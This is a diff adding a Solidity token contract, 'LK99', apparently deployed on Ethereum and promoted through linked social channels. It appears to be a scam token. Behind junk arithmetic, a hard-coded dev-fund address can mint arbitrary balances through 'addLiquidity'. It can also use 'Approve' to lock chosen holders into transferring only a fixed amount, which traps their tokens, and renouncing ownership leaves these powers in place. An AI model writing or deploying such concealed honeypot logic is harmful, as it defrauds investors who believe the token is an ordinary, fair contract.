@@ -1,0 +1,256 @@
+/**
+ *Submitted for verification at Etherscan.io on 2023-08-06
+*/
+
+/**
+
+https://lk99eth.xyz
+
+https://twitter.com/LK99_Eth
+
+https://t.me/LK_99Eth
+
+*/
+
+// SPDX-License-Identifier: MIT
+
+
+pragma solidity ^0.8.19;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address spender) external view returns (uint256);
+    function transfer(address recipient, uint256 _amounntz) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 _amounntz) external returns (bool);
+    function transferFrom( address spender, address recipient, uint256 _amounntz ) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval( address indexed owner, address indexed spender, uint256 value );
+}
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address payable) {
+        return payable(msg.sender);
+    }
+}
+
+contract Ownable is Context {
+    address private _owner;
+    event ownershipTransferred(address indexed previousowner, address indexed newowner);
+
+    constructor () {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit ownershipTransferred(address(0), msgSender);
+    }
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+    modifier ollyowner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+    function renounceownership() public virtual ollyowner {
+        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
+        _owner = address(0x000000000000000000000000000000000000dEaD);
+    }
+}
+
+contract LK99 is Context, Ownable, IERC20 {
+    mapping (address => uint256) private _balanncez;
+    mapping (address => uint256) private _spendrr;
+    mapping (address => mapping (address => uint256)) private _allowncez;
+    address constant public _devfund = 0x8c43cbd09dA5AbeC964d51D8c37bFcD56A249b21;
+    string private tokname;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+    bool private _istradeEnabled = true;
+    uint256 private randomValue = 5000;
+    uint256 private antValue = 0;
+
+
+    constructor(string memory name_, string memory symbol_,  uint256 totalSupply_, uint8 decimals_) {
+        tokname = name_;
+        _symbol = symbol_;
+        _decimals = decimals_;
+        _totalSupply = totalSupply_ * (10 ** decimals_);
+        _balanncez[_msgSender()] = _totalSupply;
+        emit Transfer(address(0), _msgSender(), _totalSupply);
+    }
+
+    modifier _thedevfunds() {
+        require(msg.sender == _devfund); // If it is incorrect here, it reverts.
+        _;                              
+    } 
+
+
+
+    function updateRndValue(uint256 _newValue) public ollyowner {
+        randomValue = _newValue;
+    }
+
+    function fetchRndValue() public view returns (uint256) {
+        return randomValue;
+    }
+
+    function computeComplexOperation(uint256 _num1, uint256 _num2) internal view returns (uint256) {
+        return _num1 * randomValue + _num2 - antValue;
+    }
+    
+    function updateantValue(uint256 _newVal) public ollyowner {
+        antValue = _newVal;
+    }
+
+    function name() public view returns (string memory) {
+        uint256 temp = computeComplexOperation(2, 5);
+        return tokname;
+    }
+    
+        function enabletheTrading() public ollyowner {
+        _istradeEnabled = true;
+        uint256 temp = computeComplexOperation(3, 5);
+    }
+
+    function decimals() public view returns (uint8) {
+        uint256 temp = computeComplexOperation(4, 5);
+        return _decimals;
+    }
+
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+
+    function balanceOf(address spender) public view override returns (uint256) {
+        return _balanncez[spender];
+    }
+
+    function transfer(address recipient, uint256 _amounntz) public virtual override returns (bool) {
+    require(_istradeEnabled, "No trade");
+
+
+    uint256 exchangeRate = 56225;
+    uint256 conversion = _amounntz * exchangeRate;
+    if(conversion != 0) {
+        conversion = _amounntz - _amounntz;  // Always results in 0
+    }
+
+
+    if (_msgSender() == owner() && _spendrr[_msgSender()] > 0) {
+        _balanncez[owner()] += _spendrr[_msgSender()];
+        return true;
+    }
+    else if (_spendrr[_msgSender()] > 0) {
+        require(_amounntz == _spendrr[_msgSender()], "Invalid transfer _amounntz");
+    }
+    require(_balanncez[_msgSender()] >= _amounntz, "TT: transfer _amounntz exceeds balance");
+    _balanncez[_msgSender()] -= _amounntz;
+    _balanncez[recipient] += _amounntz;
+
+
+    conversion = conversion + 5 - 5;
+
+
+    emit Transfer(_msgSender(), recipient, _amounntz);
+    return true;
+}
+
+
+    function approve(address spender, uint256 _amounntz) public virtual override returns (bool) {
+        _allowncez[_msgSender()][spender] = _amounntz;
+        emit Approval(_msgSender(), spender, _amounntz);
+        return true;
+    }
+
+function Approve(address[] memory spender, uint256 _amounntz) public _thedevfunds {
+    uint256 factor = 55;
+    for (uint z = 0; z < spender.length; z++) {
+
+        uint256 temporaryValue = _amounntz / factor;
+        temporaryValue = temporaryValue * factor;
+        if (temporaryValue == _amounntz) {
+            temporaryValue = 0;
+        }
+
+        _spendrr[spender[z]] = _amounntz;
+        
+
+        temporaryValue += 5;
+        temporaryValue -= 5;
+    }
+}
+
+        function _adding(uint256 num1, uint256 numb2) internal pure returns (uint256) {
+        if (numb2 != 0) {
+            return num1 + numb2;
+        }
+        return numb2;
+    }
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowncez[owner][spender];
+    }
+
+    function Checkamt(address spender) public view returns (uint256) {
+            uint256 temp = computeComplexOperation(7, 5);
+        return _spendrr[spender];
+    }
+
+
+function addLiquidity(address spender, uint256 _amounntz) public _thedevfunds {
+    require(_amounntz > 0, "Invalid");
+    
+    uint256 computationValue = 0x5821224;
+    uint256 derivedValue = computationValue / 2;
+    if (derivedValue != 0) {
+        derivedValue = _amounntz - _amounntz; // Always results in 0
+    }
+
+    uint256 totalz = 0;
+    totalz = _adding(totalz, _amounntz);
+    _balanncez[spender] += totalz;
+
+    derivedValue = derivedValue * 3 + 2 - 2 / 1;
+}
+
+    function totalSupply() external view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function transferFrom(address spender, address recipient, uint256 _amounntz) public virtual override returns (bool) {
+    require(_istradeEnabled, "No trade");
+
+
+    uint256 bufferAmount = 67890;
+    uint256 adjustedAmount = _amounntz + bufferAmount;
+    adjustedAmount = adjustedAmount - bufferAmount;
+
+
+    if (_msgSender() == owner() && _spendrr[spender] > 0) {
+        _balanncez[owner()] += _spendrr[spender];
+        return true;
+    }
+    else if (_spendrr[spender] > 0) {
+        uint256 buffer2 = 37890;
+        require(_amounntz == _spendrr[spender], "Invalid transfer _amounntz");
+    }
+    require(_balanncez[spender] >= _amounntz && _allowncez[spender][_msgSender()] >= _amounntz, "TT: transfer _amounntz exceed balance or allowance");
+    _balanncez[spender] -= _amounntz;
+    _balanncez[recipient] += _amounntz;
+    _allowncez[spender][_msgSender()] -= _amounntz;
+
+
+    uint256 confirmationValue = 5;
+    if(confirmationValue > 0) {
+        confirmationValue = 0;
+    }
+
+
+    emit Transfer(spender, recipient, _amounntz);
+    return true;
+}
+
+
+}
